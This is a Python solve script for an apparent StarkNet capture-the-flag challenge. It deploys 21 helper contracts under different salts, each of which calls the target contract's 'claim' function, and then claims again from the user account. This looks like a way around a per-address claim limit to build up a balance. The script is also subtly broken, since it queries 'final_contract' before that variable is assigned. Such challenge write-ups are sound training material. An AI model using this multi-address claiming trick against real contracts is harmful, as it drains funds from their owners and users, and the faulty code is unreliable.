from starknet_py.net import AccountClient, KeyPair
from starknet_py.net.models import StarknetChainId
from starknet_py.contract import Contract
from starknet_py.net.gateway_client import GatewayClient
from starknet_py.net.networks import TESTNET

import asyncio

# Don't forget to fill values given by gameserver
uuid = None # UUID
RPC_ENDPOINT = f"http://{uuid}@x.x.x.x:yyyy"
GATEWAY_CLIENT = GatewayClient(RPC_ENDPOINT, TESTNET)

PRIV_KEY = None # Private key as integer litteral
USER_ADDRESS = None # User address as hex string
CONTRACT_ADDRESS = None # Contract address as hex string

def get_account():
    """
    Construct account object from parameters given by the gameserver
    """
    key_pair = KeyPair.from_private_key(PRIV_KEY)

    # Create an AccountClient instance
    account = AccountClient(
        address=USER_ADDRESS,
        client=GATEWAY_CLIENT,
        key_pair=key_pair,
        chain=StarknetChainId.TESTNET,
        supported_tx_version=1,
    )

    return account

async def deploy_new_contract(salt=0, contract_source="new_implem.cairo"):
    """
    Deploy a new contract on the game blockchain
    """
    with open(contract_source, "r") as f:
        contract_source = f.read()

    deployment_result = await Contract.deploy(
            GATEWAY_CLIENT, compilation_source=contract_source, constructor_args=[int(CONTRACT_ADDRESS, 16)],
            salt=salt,
            )

    await deployment_result.wait_for_acceptance()

    contract = deployment_result.deployed_contract
    print(hex(contract.compute_address(
        compilation_source=contract_source,
        salt=salt, constructor_args=[int(CONTRACT_ADDRESS, 16)]
        )))
    return contract, contract.compute_address(salt=salt, compilation_source=contract_source, constructor_args=[int(CONTRACT_ADDRESS, 16)])


 
async def run():
    # Sanity check that we are connected
    block = await GATEWAY_CLIENT.get_block(0)

    acc_client = get_account()
    contract = await Contract.from_address(client=acc_client, address=CONTRACT_ADDRESS)

    # YOUR TXs HERE

    invocation = await final_contract.functions["get_balance"].call(int(USER_ADDRESS, 16))
    print(invocation)

    for i in range(21):
        _, contract_addr = await deploy_new_contract(i)
        helper_contract = await Contract.from_address(client=acc_client, address=contract_addr)
        invocation = await helper_contract.functions["claim"].invoke(max_fee=int(1e16))
        await invocation.wait_for_acceptance()
        print(invocation)


    final_contract = await Contract.from_address(client=acc_client, address=CONTRACT_ADDRESS)
    invocation = await final_contract.functions["claim"].invoke(max_fee=int(1e16))
    await invocation.wait_for_acceptance()
    print(invocation)

    invocation = await final_contract.functions["get_balance"].call(int(USER_ADDRESS, 16))
    print(invocation)

 

 
if __name__ == "__main__":
    asyncio.run(run())
